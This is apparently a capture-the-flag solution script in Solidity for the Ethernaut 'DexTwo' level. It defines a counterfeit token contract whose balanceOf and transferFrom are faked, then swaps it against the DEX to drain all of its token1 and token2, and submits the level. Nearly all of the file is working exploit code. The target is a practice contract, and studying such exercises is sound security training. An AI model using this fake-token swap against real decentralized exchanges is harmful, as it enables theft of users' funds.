// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Level} from "ethernaut/levels/base/Level.sol";
import {Math} from "@openzeppelin/utils/math/Math.sol";
import {Vm, console, Attacker} from "../src/Attacker.sol";
import {DexTwo, SwappableTokenTwo} from "../src/DexTwo.sol";

/**
 *
 * Level address: 0xf59112032D54862E199626F55cFad4F8a3b0Fce9
 * This level will ask you to break DexTwo, a subtlely modified Dex contract
 * from the previous level, in a different way.
 *
 * You need to drain all balances of token1 and token2 from the DexTwo contract
 * to succeed in this level.
 *
 * You will still start with 10 tokens of token1 and 10 of token2. The DEX
 * contract still starts with 100 of each token.
 *
 *   Things that might help:
 *
 * How has the swap method been modified?
 *
 */
contract Pawn {
    DexTwo private dex;

    constructor(DexTwo _dex) {
        dex = _dex;
    }

    function balanceOf(address account) public view returns (uint256) {
        if (account == address(dex)) {
            return Math.max(
                SwappableTokenTwo(dex.token1()).balanceOf(address(dex)),
                SwappableTokenTwo(dex.token2()).balanceOf(address(dex))
            );
        }
        return type(uint256).max;
    }

    function transferFrom(
        address,
        address,
        uint256
    )
        public
        pure
        returns (bool)
    {
        return true;
    }

    function attack() public {
        address token1 = dex.token1();
        address token2 = dex.token2();

        if (
            SwappableTokenTwo(token2).balanceOf(address(dex))
                > SwappableTokenTwo(token2).balanceOf(address(dex))
        ) {
            (token1, token2) = (token2, token1);
        }

        dex.swap(
            address(this),
            token1,
            SwappableTokenTwo(token1).balanceOf(address(dex))
        );

        dex.swap(
            address(this),
            token2,
            SwappableTokenTwo(token2).balanceOf(address(dex))
        );
    }
}

contract DexTwoScript is Attacker {
    Level private level = Level(0xf59112032D54862E199626F55cFad4F8a3b0Fce9);

    function run() external {
        vm.startBroadcast(me.privateKey);
        address instance = getNewLevelInstance(level);
        DexTwo dex = DexTwo(instance);
        Pawn pawn = new Pawn(dex);
        pawn.attack();

        SwappableTokenTwo token1 = SwappableTokenTwo(dex.token1());
        SwappableTokenTwo token2 = SwappableTokenTwo(dex.token2());

        require(
            token1.balanceOf(address(dex)) == 0
                && token2.balanceOf(address(dex)) == 0,
            "Tokens not drained"
        );
        require(submitInstance(), "Level submission failed");
        vm.stopBroadcast();
    }
}
